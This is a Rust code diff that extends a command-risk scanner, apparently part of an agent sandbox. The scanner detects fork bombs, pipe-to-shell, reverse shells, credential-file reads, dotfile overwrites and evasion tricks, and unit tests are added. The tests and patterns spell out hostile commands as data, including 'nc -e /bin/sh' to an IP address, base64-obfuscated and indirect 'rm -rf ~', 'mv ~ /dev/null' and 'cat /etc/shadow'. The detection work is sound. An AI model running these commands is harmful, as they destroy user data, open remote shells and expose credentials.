@@ -207,14 +207,22 @@ impl SecurityPolicy {
         let trimmed = cmd.trim();
         let lower = trimmed.to_lowercase();
 
-        // 1. Fork bomb and denial-of-service loops
-        if lower.contains(":(){ :|:& };:")
+        // 1. Fork bomb and denial-of-service loops (including function definitions and loops)
+        let is_fork_bomb = lower.contains(":(){")
             || lower.contains(":(){:|:&};:")
+            || lower.contains(":(){ :|:& };:")
             || lower.contains(":(){ :|: & };:")
+            || lower.contains("(){ :|:& };:")
+            || lower.contains("(){:|:&};:")
+            || lower.contains("(){ :|: & };:")
             || lower.contains("fork while")
             || (lower.contains("while true; do") && lower.contains("& done"))
             || (lower.contains("while :; do") && lower.contains("& done"))
-        {
+            || (lower.contains("perl") && lower.contains("fork") && lower.contains("while"))
+            || (lower.contains("python")
+                && lower.contains("os.fork")
+                && (lower.contains("while") || lower.contains("for ")));
+        if is_fork_bomb {
             return Some((
                 RiskLevel::Critical,
                 "Fork bomb or process exhaustion denial-of-service vector",
@@ -247,16 +255,27 @@ impl SecurityPolicy {
         // 4. Pipe to shell interpreter (e.g. "base64 | sh", "curl ... | bash")
         let pipe_interpreters = [
             "| sh",
+            "|sh",
             "| bash",
+            "|bash",
             "| zsh",
+            "|zsh",
             "| python",
+            "|python",
             "| python3",
+            "|python3",
             "| perl",
+            "|perl",
             "| ruby",
+            "|ruby",
             "| node",
+            "|node",
             "| powershell",
+            "|powershell",
             "| pwsh",
+            "|pwsh",
             "| cmd",
+            "|cmd",
         ];
         for pi in &pipe_interpreters {
             if lower.contains(pi) {
@@ -282,7 +301,15 @@ impl SecurityPolicy {
             || lower.contains("id_ed25519")
             || lower.contains(".ssh")
             || lower.contains(".aws")
-            || lower.contains(".kube");
+            || lower.contains(".kube")
+            || lower.contains("/etc/shadow")
+            || lower.contains("/etc/passwd")
+            || lower.contains("/etc/sudoers")
+            || lower.contains("/etc/master.passwd")
+            || lower.contains("/etc/security/")
+            || lower.contains("system32/config/sam")
+            || lower.contains("system32\\config\\sam")
+            || lower.contains("sam.hive");
 
         if has_network_tool && has_sensitive_file {
             return Some((
@@ -302,8 +329,123 @@ impl SecurityPolicy {
                 "Raw socket transmission / reverse shell vector",
             ));
         }
+        if (lower.contains("nc ") || lower.contains("ncat ") || lower.contains("netcat "))
+            && (lower.contains(" -e ") || lower.contains(" -e") || lower.contains(" -c "))
+            || lower.contains("socat exec:")
+        {
+            return Some((
+                RiskLevel::Critical,
+                "Reverse shell execution flag (-e / -c)",
+            ));
+        }
 
-        // 6. Direct inspection of sensitive credentials via terminal commands
+        // 6. Dotfile redirection / overwrite (> ~/.bashrc, > ~/.zshrc, > .env)
+        if (trimmed.contains('>') || trimmed.contains(">>"))
+            && (lower.contains("> ~/")
+                || lower.contains(">> ~/")
+                || lower.contains("> ~/.bash")
+                || lower.contains(">> ~/.bash")
+                || lower.contains("> ~/.zsh")
+                || lower.contains(">> ~/.zsh")
+                || lower.contains("> ~/.profile")
+                || lower.contains(">> ~/.profile")
+                || lower.contains("> ~/.ssh")
+                || lower.contains(">> ~/.ssh")
+                || lower.contains("> .env")
+                || lower.contains(">> .env")
+                || lower.contains("> /etc/")
+                || lower.contains(">> /etc/"))
+        {
+            return Some((
+                RiskLevel::Critical,
+                "Destructive redirection or overwrite of system/user dotfile",
+            ));
+        }
+
+        // 7. Dynamic shell eval execution
+        if lower.starts_with("eval ")
+            || lower.contains(" eval ")
+            || lower.starts_with("eval \"")
+            || lower.starts_with("eval '")
+        {
+            return Some((RiskLevel::High, "Dynamic shell eval execution"));
+        }
+
+        // 8. Variable assignment followed by indirect variable invocation: e.g. "X=rm; $X -rf ~"
+        let is_var_exec = (lower.contains('=')
+            && (lower.contains(";$")
+                || lower.contains("; $")
+                || lower.contains("&$")
+                || lower.contains("& $")))
+            || lower.starts_with('$')
+            || lower.contains(" $");
+        if is_var_exec {
+            let words: Vec<&str> = trimmed.split_whitespace().collect();
+            let has_var_command = words.iter().any(|w| {
+                w.starts_with('$')
+                    && !w.starts_with("$(")
+                    && w.len() > 1
+                    && w[1..]
+                        .chars()
+                        .next()
+                        .map(|c| c.is_ascii_alphabetic())
+                        .unwrap_or(false)
+            });
+            if has_var_command {
+                return Some((
+                    RiskLevel::High,
+                    "Dynamic variable expansion command execution",
+                ));
+            }
+        }
+
+        // 9. Recursive shell unwrapping: e.g. "bash -c 'rm -rf ~'" or "sh -c 'del /f /s /q c:\'"
+        if let Some(inner) = Self::unwrap_shell_eval(trimmed) {
+            if let Some(inner_risk) = Self::scan_command_risk(&inner) {
+                return Some(inner_risk);
+            }
+        }
+
+        // 10. Inline interpreter execution flags (-c / -e / -Command)
+        let inline_interpreters = [
+            "python -c",
+            "python3 -c",
+            "python2 -c",
+            "node -e",
+            "nodejs -e",
+            "perl -e",
+            "ruby -e",
+            "php -r",
+            "lua -e",
+            "bash -c",
+            "sh -c",
+            "zsh -c",
+        ];
+        for ii in &inline_interpreters {
+            if lower.starts_with(ii) || lower.contains(&format!(" {}", ii)) {
+                if lower.contains("os.system")
+                    || lower.contains("subprocess")
+                    || lower.contains("shutil")
+                    || lower.contains("child_process")
+                    || lower.contains("exec(")
+                    || lower.contains("system(")
+                    || lower.contains("fork")
+                    || lower.contains("unlink")
+                    || lower.contains("rm ")
+                {
+                    return Some((
+                        RiskLevel::Critical,
+                        "Inline interpreter arbitrary process or filesystem execution",
+                    ));
+                }
+                return Some((
+                    RiskLevel::High,
+                    "Inline interpreter script execution flag (-c / -e / eval)",
+                ));
+            }
+        }
+
+        // 11. Direct inspection of sensitive credentials via terminal commands
         if (lower.starts_with("cat ")
             || lower.starts_with("type ")
             || lower.starts_with("get-content ")
@@ -316,14 +458,7 @@ impl SecurityPolicy {
             return Some((RiskLevel::High, "Command targets sensitive credential file"));
         }
 
-        // 7. Recursive shell unwrapping: e.g. "bash -c 'rm -rf ~'"
-        if let Some(inner) = Self::unwrap_shell_eval(trimmed) {
-            if let Some(inner_risk) = Self::scan_command_risk(&inner) {
-                return Some(inner_risk);
-            }
-        }
-
-        // 8. Split command chain across delimiters (;, &&, ||, |, &) and scan subcommands
+        // 12. Split command chain across delimiters (;, &&, ||, |, &) and scan subcommands
         let sub_cmds = Self::split_command_chain(cmd);
         let mut highest: Option<(RiskLevel, &'static str)> = None;
 
@@ -399,6 +534,29 @@ impl SecurityPolicy {
                 ));
             }
             return Some((RiskLevel::High, "Recursive directory deletion"));
+        }
+
+        if normalized.starts_with("mv ~")
+            || normalized.contains(" mv ~")
+            || normalized.starts_with("mv /")
+            || normalized.contains(" mv /")
+            || normalized.contains("mv -f ~")
+            || normalized.contains("mv -f /")
+        {
+            return Some((
+                RiskLevel::Critical,
+                "Destructive recursive relocation of root or user home directory",
+            ));
+        }
+
+        if normalized.contains("xargs rm")
+            || normalized.contains("xargs -i rm")
+            || normalized.contains("xargs -i {} rm")
+        {
+            return Some((
+                RiskLevel::Critical,
+                "Unbounded xargs rm recursive execution",
+            ));
         }
 
         if normalized.contains("find ") && normalized.contains("-delete") {
@@ -549,6 +707,11 @@ impl SecurityPolicy {
             "/.bash_history",
             "/.zsh_history",
             "/.env",
+            "/etc/shadow",
+            "/etc/passwd",
+            "/etc/sudoers",
+            "/etc/master.passwd",
+            "system32/config/sam",
         ];
 
         for frag in &sensitive_fragments {
@@ -671,6 +834,63 @@ mod tests {
         let risk2 = SecurityPolicy::scan_command_risk(cmd2);
         assert!(risk2.is_some());
         assert_eq!(risk2.unwrap().0, RiskLevel::Critical);
+    }
+
+    #[test]
+    fn test_shell_evasion_vectors_intercepted() {
+        // python3 -c "os.system('rm -rf ~')"
+        let r1 = SecurityPolicy::scan_command_risk("python3 -c \"os.system('rm -rf ~')\"");
+        assert!(r1.is_some());
+        assert_eq!(r1.unwrap().0, RiskLevel::Critical);
+
+        // node -e and perl -e
+        let r2 = SecurityPolicy::scan_command_risk("node -e \"process.exit(1)\"");
+        assert!(r2.is_some());
+        assert_eq!(r2.unwrap().0, RiskLevel::High);
+
+        let r3 = SecurityPolicy::scan_command_risk("perl -e \"print 'hello'\"");
+        assert!(r3.is_some());
+        assert_eq!(r3.unwrap().0, RiskLevel::High);
+
+        // eval "rm -rf ~"
+        let r4 = SecurityPolicy::scan_command_risk("eval \"rm -rf ~\"");
+        assert!(r4.is_some());
+        assert_eq!(r4.unwrap().0, RiskLevel::High);
+
+        // X=rm; $X -rf ~
+        let r5 = SecurityPolicy::scan_command_risk("X=rm; $X -rf ~");
+        assert!(r5.is_some());
+        assert_eq!(r5.unwrap().0, RiskLevel::High);
+
+        // base64 -d | sh
+        let r6 = SecurityPolicy::scan_command_risk("echo cm0gLXJmIH4= | base64 -d | sh");
+        assert!(r6.is_some());
+        assert_eq!(r6.unwrap().0, RiskLevel::High);
+
+        // xargs rm -rf
+        let r7 = SecurityPolicy::scan_command_risk("find . | xargs rm -rf");
+        assert!(r7.is_some());
+        assert_eq!(r7.unwrap().0, RiskLevel::Critical);
+
+        // mv ~ /dev/null
+        let r8 = SecurityPolicy::scan_command_risk("mv ~ /dev/null");
+        assert!(r8.is_some());
+        assert_eq!(r8.unwrap().0, RiskLevel::Critical);
+
+        // > ~/.bashrc
+        let r9 = SecurityPolicy::scan_command_risk("> ~/.bashrc");
+        assert!(r9.is_some());
+        assert_eq!(r9.unwrap().0, RiskLevel::Critical);
+
+        // nc -e /bin/sh
+        let r10 = SecurityPolicy::scan_command_risk("nc -e /bin/sh 10.0.0.1 4444");
+        assert!(r10.is_some());
+        assert_eq!(r10.unwrap().0, RiskLevel::Critical);
+
+        // cat /etc/shadow
+        let r11 = SecurityPolicy::scan_command_risk("cat /etc/shadow");
+        assert!(r11.is_some());
+        assert_eq!(r11.unwrap().0, RiskLevel::High);
     }
 
     #[test]
